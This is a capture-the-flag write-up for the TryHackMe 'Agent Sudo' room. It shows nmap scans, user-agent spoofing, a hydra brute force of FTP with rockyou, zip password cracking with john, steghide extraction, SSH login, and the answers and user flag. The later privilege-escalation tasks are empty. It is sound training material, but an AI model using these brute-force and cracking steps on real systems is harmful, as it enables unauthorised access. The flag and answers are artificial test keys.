# Agent Sudo

<div align="left">

<figure><img src=".gitbook/assets/aedc6b66c222e15ff740c282a0c3f44e.png" alt="" width="188"><figcaption><p>tryhackme.com - © TryHackMe</p></figcaption></figure>

</div>

🔗 [Agent Sudo](https://tryhackme.com/room/agentsudoctf)

### Task 1 - Deploy the machine

🎯 Target IP: `10.10.80.70`

Create a directory for machine on the Desktop and a directory containing the scans with nmap.

### Task 2 - Reconnaissance

```bash
su
echo "10.10.80.70 agent_sudo.thm" >> /etc/hosts

mkdir thm/agent_sudo.thm  
cd thm/agent_sudo.thm

# At the end of the room
# To clean up the last line from the /etc/hosts file
sed -i '$ d' /etc/hosts
```

I prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.

```bash
ping -c 3 agent_sudo.thm
PING agent_sudo.thm (10.10.80.70) 56(84) bytes of data.
64 bytes from agent_sudo.thm (10.10.80.70): icmp_seq=1 ttl=63 time=132 ms
64 bytes from agent_sudo.thm (10.10.80.70): icmp_seq=2 ttl=63 time=81.8 ms
64 bytes from agent_sudo.thm (10.10.80.70): icmp_seq=3 ttl=63 time=123 ms
```

Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target is a \*nix system (probably Linux), while Windows systems usually have a TTL of 128 secs.

### Task 3 - Enumerate

#### 3.1 - How many open ports?

```bash
nmap --open -n -Pn -vvv -T4 agent_sudo.thm 
```

```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-02 14:49 EDT
Warning: Hostname agent_sudo.thm resolves to 2 IPs. Using 10.10.80.70.
Initiating SYN Stealth Scan at 14:49
Scanning agent_sudo.thm (10.10.80.70) [1000 ports]
Discovered open port 80/tcp on 10.10.80.70
Discovered open port 22/tcp on 10.10.80.70
Discovered open port 21/tcp on 10.10.80.70
Completed SYN Stealth Scan at 14:49, 1.15s elapsed (1000 total ports)
Nmap scan report for agent_sudo.thm (10.10.80.70)
Host is up, received user-set (0.078s latency).
Other addresses for agent_sudo.thm (not scanned): 10.10.80.70
Scanned at 2023-07-02 14:49:50 EDT for 1s
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sudo</td><td>run as root</td></tr><tr><td>sC</td><td>run default scripts</td></tr><tr><td>sV</td><td>enumerate versions</td></tr><tr><td>A</td><td>aggressive mode</td></tr><tr><td>T4</td><td>run a bit faster</td></tr><tr><td>oN</td><td>output to file with nmap formatting</td></tr></tbody></table>

```bash
nmap -p21,22,80 -sCV -vvv -T4 agent_sudo.thm
```

```bash
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5hdrxDB30IcSGobuBxhwKJ8g+DJcUO5xzoaZP/vJBtWoSf4nWDqaqlJdEF0Vu7Sw7i0R3aHRKGc5mKmjRuhSEtuKKjKdZqzL3xNTI2cItmyKsMgZz+lbMnc3DouIHqlh748nQknD/28+RXREsNtQZtd0VmBZcY1TD0U4XJXPiwleilnsbwWA7pg26cAv9B7CcaqvMgldjSTdkT1QNgrx51g4IFxtMIFGeJDh2oJkfPcX6KDcYo6c9W1l+SCSivAQsJ1dXgA2bLFkG/wPaJaBgCzb8IOZOfxQjnIqBdUNFQPlwshX/nq26BMhNGKMENXJUpvUTshoJ/rFGgZ9Nj31r
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHdSVnnzMMv6VBLmga/Wpb94C9M2nOXyu36FCwzHtLB4S4lGXa2LzB5jqnAQa0ihI6IDtQUimgvooZCLNl6ob68=
|   256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOL3wRjJ5kmGs/hI4aXEwEndh81Pm/fvo8EvcpDHR5nt
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: 400 Bad Request
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

It looks like there are three open ports on the machine: 21, 22, 80.

#### 3.2 - How you redirect yourself to a secret page?

<div align="left">

<figure><img src=".gitbook/assets/Schermata del 2023-07-02 22-30-24.png" alt=""><figcaption></figcaption></figure>

</div>

{% hint style="info" %}
user-agent
{% endhint %}

#### 3.3 - What is the agent name?

We can see our user-agent using dev mode (F12)

<figure><img src=".gitbook/assets/Schermata del 2023-07-02 22-57-07 (1).png" alt=""><figcaption></figcaption></figure>

We say that the correct user-agent is a capital letter, than using BurpSuite we can test all alphabet

{% file src=".gitbook/assets/user-agent_burp_suite.webm" %}

<figure><img src=".gitbook/assets/Schermata del 2023-07-03 00-07-36.png" alt=""><figcaption></figcaption></figure>

We need to set user-agent to 'C' to see agent name.

For this thing, we can use a firefox extension: [`User-Agent Switcher and Manager`](https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher/?utm\_source=addons.mozilla.org\&utm\_medium=referral\&utm\_content=search)

<figure><img src=".gitbook/assets/Schermata del 2023-07-03 00-12-35 (2).png" alt=""><figcaption><p>setting user-agent to 'C'</p></figcaption></figure>

Refreshing page we see agent name:

<figure><img src=".gitbook/assets/Schermata del 2023-07-03 00-13-02.png" alt=""><figcaption><p><a href="http://10.10.89.63/agent_C_attention.php">http://10.10.89.63/agent_C_attention.php</a></p></figcaption></figure>

{% hint style="info" %}
chris
{% endhint %}

### Task 4 - Hash cracking and brute-force

#### 4.1 - FTP password

We knwo a username: chris, then, we can use hydra to find psw:\


```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt agent_sudo.thm ftp
```

```
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-02 18:24:07
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://agent_sudo.thm:21/
[STATUS] 244.00 tries/min, 244 tries in 00:01h, 14344155 to do in 979:48h, 16 active
[21][ftp] host: agent_sudo.thm   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
```

{% hint style="info" %}
crystal
{% endhint %}

chris::crystal

#### 4.2 - Zip file password

It's time to access with ftp credentials:\


```bash
ftp agent_sudo.thm
Connected to agent_sudo.thm.
220 (vsFTPd 3.0.3)
Name (agent_sudo.thm:kali): chris
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||10070|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
```

```bash
ftp> get To_agentJ.txt
local: To_agentJ.txt remote: To_agentJ.txt
229 Entering Extended Passive Mode (|||54801|)
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
100% |***********************************************************************************|   217       43.31 KiB/s    00:00 ETA
226 Transfer complete.
217 bytes received in 00:00 (3.08 KiB/s)
```

```bash
cat To_agentJ.txt 
```

_Dear agent J,_

_All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you._

_From, Agent C_

It surely means that we're talking about steganography, then, we download all photos with get command.

```bash
exiftool cute-alien.jpg
```

```bash
ExifTool Version Number         : 12.63
File Name                       : cute-alien.jpg
Directory                       : .
File Size                       : 33 kB
File Modification Date/Time     : 2019:10:29 08:22:37-04:00
File Access Date/Time           : 2023:07:02 18:55:15-04:00
File Inode Change Date/Time     : 2023:07:02 18:55:15-04:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 96
Y Resolution                    : 96
Image Width                     : 440
Image Height                    : 501
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 440x501
Megapixels                      : 0.220
```

```bash
exiftool cutie.png
```

```bash
ExifTool Version Number         : 12.63
File Name                       : cutie.png
Directory                       : .
File Size                       : 35 kB
File Modification Date/Time     : 2019:10:29 08:33:51-04:00
File Access Date/Time           : 2023:07:02 18:55:22-04:00
File Inode Change Date/Time     : 2023:07:02 18:55:22-04:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 528
Image Height                    : 528
Bit Depth                       : 8
Color Type                      : Palette
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Palette                         : (Binary data 762 bytes, use -b option to extract)
Transparency                    : (Binary data 42 bytes, use -b option to extract)
Warning                         : [minor] Trailer data after PNG IEND chunk
Image Size                      : 528x528
Megapixels                      : 0.279
```

These two informations are important:

```
Compression                     : Deflate/Inflate
Palette                         : (Binary data 762 bytes, use -b option to extract)
```

Then, we use flag -b to extract archive:

```bash
exiftool -b cutie.png
```

```bash
Warning: [minor] Trailer data after PNG IEND chunk - cutie.png
12.63cutie.png.348422019:10:29 08:33:51-04:002023:07:02 18:55:22-04:002023:07:02 18:55:22-04:00100644PNGPNGimage/png52852883000�����������������������������������������������������������������������������������������������������������������������������a���*EB��:����ϲ30p�.(CA��b+FB��8">;&@B&A>9RO =:#<A;8$@=96.)%>A��b��:&AA��:��e��c��]��9��_�`P��b4-HC��Z5NK�#▒��W���!:@t�-�ӵ0KG�����������Ͱ���r�-u�"6SB��?/KB�����6��G��������L��C2OB��ب�Z���CZWn�,Rhc��T9X@>VRMc^�ٻ����ꖞ�P��`H_[z�;��W��9l�,���Wli������j}z��])&��c���^rmGk>t�<Nq;��d��;���cwt������>\G��Z�����Ց����:������Q|?Be>>^>��\!EC��������Ј��u����\Y|M��������QsK}��o�~��X�����vEeHm�<��ƌ��a�=l�*x����mg�=$ ������`�2m�R�è]�>���a�OW�>h�0��/����ôf�PWw5���t�S��������°����PLlJ����������󜥰�i{n�:�"�˼}�|z�)[oa�������줃����I��Vx�T�����Aq�q��������W3D?y�5���}�U�aPAA=�>0�'��x�UF�.%sPHz6/|�nVE?e82��ȅ�ZM�UJ��N��D��
�(���0Θ�?E�LU8��]��eԹsxoj������[minor] Trailer data after PNG IEND chunk528 5280.278784                 
```

it's not a good solution, we can try another similar tool (binwalk):

```bash
binwalk -e cutie.png
```

```bash
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression

WARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Errno 2] No such file or directory: 'jar', 'jar xvf '%e'' might not be installed correctly
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txtls

34820         0x8804          End of Zip archive, footer length: 22
```

```bash
ls -l         
total 316
-rw-r--r-- 1 kali kali 279312 Jul  2 19:11 365
-rw-r--r-- 1 kali kali  33973 Jul  2 19:11 365.zlib
-rw-r--r-- 1 kali kali    280 Jul  2 19:11 8702.zip
-rw-r--r-- 1 kali kali      0 Oct 29  2019 To_agentR.txt
```

So we used “zip2john” to crack the zip file password:

```bash
zip2john 8702.zip > Output.txt
```

And then we used John the Ripper to crack the hash:

```bash
john Output.txt
```

```bash
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 3 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:00 DONE 2/3 (2023-07-03 14:07) 1.063g/s 46195p/s 46195c/s 46195C/s 123456..Open
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

We've found the archive password:\


{% hint style="info" %}
alien
{% endhint %}

#### 4.3 - Steg password

So we tried to extract the zip file but unzip command didn’t work so we used this command

```
7z e 8702.zip
```

<div align="left">

<figure><img src=".gitbook/assets/Schermata del 2023-07-03 20-16-51.png" alt=""><figcaption></figcaption></figure>

</div>

```bash
ls
365  365.zlib  8702.zip  Output.txt  To_agentR_1.txt  To_agentR.txt
cat To_agentR.txt
```

_Agent C,_

_We need to send the picture to 'QXJlYTUx' as soon as possible!_

_By, Agent R_

This word: _QXJlYTUx can be an encoded psw,_&#x20;

_we can use a web tool:_ [_https://gchq.github.io/CyberChef/#input=UVhKbFlUVXg_](https://gchq.github.io/CyberChef/#input=UVhKbFlUVXg) _or_

```bash
echo 'QXJlYTUx' | base64 -d 
```

{% hint style="info" %}
Area51
{% endhint %}

#### 4.4 - Who is the other agent (in full name)?

Reading last request (steg psw), we image that's the cute-alien.jpg steg password, then we use steghide to extract information:

```bash
steghide --extract -sf cute-alien.jpg
```

```bash
Enter passphrase: 
wrote extracted data to "message.txt".
```

```bash
cat message.txt
```

_Hi james,_

_Glad you find this message. Your login password is hackerrules!_

_Don't ask me why the password look cheesy, ask agent R who set this password for you._

_Your buddy, chris_

{% hint style="info" %}
James
{% endhint %}

#### 4.5 - SSH password

Reading message.txt, we know that the psw is:&#x20;

{% hint style="info" %}
_hackerrules!_
{% endhint %}

```bash
ssh james@agent_sudo.thm
james@agent_sudo.thm's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)
```

### Task 5 - Capture the user flag

#### 5.1 - What is the user flag?

```bash
ls
Alien_autospy.jpg  user_flag.txt
cat user_flag.txt 
```

<details>

<summary>🚩 Flag 1 (flag.txt)</summary>

b03d975e8c92a7c04146cfa7a5a313c7

</details>

#### 5.2 - What is the incident of the photo called?

\




### Task 6 - Privilege escalation

#### 6.1 - CVE number for the escalation&#x20;





6.2 - What is the root flag?

\




6.3 - (Bonus) Who is Agent R?

\




